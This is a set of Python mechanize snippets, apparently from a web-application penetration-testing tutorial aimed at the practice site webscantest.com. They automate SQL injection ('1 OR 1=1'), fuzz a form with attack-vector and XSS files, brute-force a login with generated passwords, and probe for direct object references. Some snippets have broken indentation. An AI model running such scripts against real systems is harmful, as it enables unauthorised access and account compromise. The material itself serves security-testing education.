["```py\nimport mechanize \n # Import module \n\n# Set the URL \nurl = \"http://www.webscantest.com/datastore/search_by_id.php\" \n\nrequest = mechanize.Browser() \n\nrequest.open(url) \n\n# Selected the first form in the page \nrequest.select_form(nr=0) \n\n# Set the Id  \nrequest[\"id\"] = \"1 OR 1=1\" \n\n# Submit the form \nresponse = request.submit() \n\ncontent = response.read() \n\nprint content \n\n```", "```py\nimport mechanize \n\n# Set the URL \nurl = \"http://www.webscantest.com/datastore/search_by_id.php\" \n\nbrowser = mechanize.Browser() \n\nattackNumber = 1 \n\n# Read attack vectors \nwith open('attack-vector.txt') as f: \n\n    # Send request with each attack vector \n    for line in f: \n\n         browser.open(url) \n\n   browser.select_form(nr=0) \n\n         browser[\"id\"] = line \n\n         res = browser.submit() \n\n   content = res.read() \n\n      # write the response to file \n   output = open('response/'+str(attackNumber)+'.txt', 'w') \n\n   output.write(content) \n\n   output.close() \n\n   print attackNumber \n\n   attackNumber += 1 \n\n```", "```py\n# import required modules\nfrom itertools import combinations  \n\nfrom string import ascii_lowercase \n\n# Possible password list \n\npasswords = (p for p in combinations(ascii_lowercase,8)) \n\nfor p in passwords: \n\n    print ''.join(p) \n\n```", "```py\nimport mechanize \n\nfrom itertools import combinations  \n\nfrom string import ascii_lowercase \n\nurl = \"http://www.webscantest.com/login.php\" \n\nbrowser = mechanize.Browser() \n\nattackNumber = 1 \n\n# Possible password list \n\npasswords = (p for p in combinations(ascii_lowercase,8)) \n\nfor p in passwords: \n\n    browser.open(url) \n\n    browser.select_form(nr=0) \n\n    browser[\"login\"] = 'testuser' \n\n    browser[\"passwd\"] = ''.join(p) \n\n    res = browser.submit() \n\n    content = res.read() \n\n    # Print  response code \n\n    print res.code \n\n     # Write response to file \n\n    output = open('response/'+str(attackNumber)+'.txt', 'w') \n\n    output.write(content) \n\n    output.close() \n\n    attackNumber += 1 \n\n```", "```py\n    # check if we were taken back to the login page or not \n\n    if content.find('<input type=\"password\" name=\"passwd\" />') > 0: \n\n         print \"Login failed\" \n\n```", "```py\nimport mechanize \n\nurl = \"http://www.webscantest.com/crosstraining/aboutyou.php\" \n\nbrowser = mechanize.Browser() \n\nattackNumber = 1 \n\nwith open('XSS-vectors.txt') as f: \n\n    for line in f: \n\n         browser.open(url) \n\n         browser.select_form(nr=0) \n\n         browser[\"fname\"] = line \n\n         res = browser.submit() \n\n         content = res.read() \n\n         # check the attack vector is printed in the response. \n         if content.find(line) > 0: \n\n               print \"Possible XXS\" \n\n   output = open('response/'+str(attackNumber)+'.txt', 'w') \n\n   output.write(content) \n\n   output.close() \n\n   print attackNumber \n\n   attackNumber += 1 \n\n```", "```py\nimport mechanize \n\nurl = \"http://www.webscantest.com/business/access.php?serviceid=\" \n\nattackNumber = 1 \n\nfor i in range(5): \n\n    res = mechanize.urlopen(url+str(i)) \n\n    content = res.read() \n\n    #  check if the content is accessible \n\n    if content.find(\"You service\") > 0: \n\n         print \"Possible Direct Object Reference\" \n\n    output = open('response/'+str(attackNumber)+'.txt', 'w') \n\n    output.write(content) \n\n    output.close() \n\n    print attackNumber \n\n    attackNumber += 1 \n\n```", "```py\nimport mechanize \n\ncookies = mechanize.CookieJar() \n\ncookie_opener = mechanize.build_opener(mechanize.HTTPCookieProcessor(cookies)) \nmechanize.install_opener(cookie_opener)  \n\nurl = \"http://www.webscantest.com/crosstraining/aboutyou.php\" \n\nres = mechanize.urlopen(url) \n\ncontent = res.read()    \n\n```"]